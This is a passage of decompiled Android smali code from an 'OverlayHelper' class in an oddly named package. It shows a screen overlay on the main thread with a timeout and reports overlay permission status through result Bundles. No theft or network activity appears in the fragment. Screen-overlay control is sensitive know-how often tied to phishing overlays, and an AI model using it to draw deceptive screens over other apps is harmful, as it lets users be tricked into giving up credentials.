    invoke-virtual {p3, v0, p2}, Landroid/os/Bundle;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    .line 67
    const-string v0, "result_path"

    invoke-virtual {p3, v0, p1}, Landroid/os/Bundle;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p3

    goto :goto_0

    :cond_3
    move-object p2, p1

    move-object p3, p2

    :goto_0
    if-eqz p2, :cond_4

    move-object v9, p2

    goto :goto_1

    :cond_4
    move-object v9, p1

    :goto_1
    if-eqz p3, :cond_5

    move-object v10, p3

    goto :goto_2

    :cond_5
    move-object v10, p1

    .line 73
    :goto_2
    new-instance p1, Ljava/util/concurrent/atomic/AtomicReference;

    invoke-direct {p1}, Ljava/util/concurrent/atomic/AtomicReference;-><init>()V

    .line 74
    new-instance p2, Ljava/util/concurrent/CountDownLatch;

    const/4 p3, 0x1

    invoke-direct {p2, p3}, Ljava/util/concurrent/CountDownLatch;-><init>(I)V

    .line 76
    new-instance p3, Lcom/servers/ozzbzk/OverlayHelper$$ExternalSyntheticLambda2;

    move-object v5, p3

    move-object v6, p0

    move-object v7, p1

    move-object v11, p2

    invoke-direct/range {v5 .. v11}, Lcom/servers/ozzbzk/OverlayHelper$$ExternalSyntheticLambda2;-><init>(Lcom/servers/ozzbzk/OverlayHelper;Ljava/util/concurrent/atomic/AtomicReference;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/util/concurrent/CountDownLatch;)V

    .line 84
    invoke-static {}, Landroid/os/Looper;->myLooper()Landroid/os/Looper;

    move-result-object v0

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    if-ne v0, v1, :cond_6

    .line 85
    invoke-interface {p3}, Ljava/lang/Runnable;->run()V

    goto :goto_3

    .line 87
    :cond_6
    iget-object v0, p0, Lcom/servers/ozzbzk/OverlayHelper;->mainHandler:Landroid/os/Handler;

    invoke-virtual {v0, p3}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 89
    :try_start_0
    sget-object p3, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v0, 0x8

    invoke-virtual {p2, v0, v1, p3}, Ljava/util/concurrent/CountDownLatch;->await(JLjava/util/concurrent/TimeUnit;)Z

    move-result p2

    if-nez p2, :cond_7

    .line 90
    new-instance p1, Landroid/os/Bundle;

    invoke-direct {p1}, Landroid/os/Bundle;-><init>()V

    .line 91
    invoke-virtual {p1, v4, v3}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    .line 92
    const-string p2, "overlay show timeout"

    invoke-virtual {p1, v2, p2}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    return-object p1

    .line 103
    :cond_7
    :goto_3
    invoke-virtual {p1}, Ljava/util/concurrent/atomic/AtomicReference;->get()Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/os/Bundle;

    if-eqz p1, :cond_8

    goto :goto_4

    .line 104
    :cond_8
    const-string p1, "overlay failed"

    invoke-static {p1}, Lcom/servers/ozzbzk/OverlayHelper;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p1

    :goto_4
    return-object p1

    .line 96
    :catch_0
    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Thread;->interrupt()V

    .line 97
    new-instance p1, Landroid/os/Bundle;

    invoke-direct {p1}, Landroid/os/Bundle;-><init>()V

    .line 98
    invoke-virtual {p1, v4, v3}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    .line 99
    const-string p2, "interrupted"

    invoke-virtual {p1, v2, p2}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    return-object p1
.end method

.method status()Landroid/os/Bundle;
    .locals 4

    .line 186
    new-instance v0, Landroid/os/Bundle;

    invoke-direct {v0}, Landroid/os/Bundle;-><init>()V

    .line 187
    const-string v1, "success"

    const/4 v2, 0x1

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    .line 188
    const-string v1, "showing"

    iget-boolean v3, p0, Lcom/servers/ozzbzk/OverlayHelper;->showing:Z

    invoke-virtual {v0, v1, v3}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    .line 190
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x17

    if-lt v1, v3, :cond_0

    .line 191
    iget-object v1, p0, Lcom/servers/ozzbzk/OverlayHelper;->context:Landroid/content/Context;

    invoke-static {v1}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v2

    .line 193
    :cond_0
    const-string v1, "can_overlay"

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    return-object v0
.end method
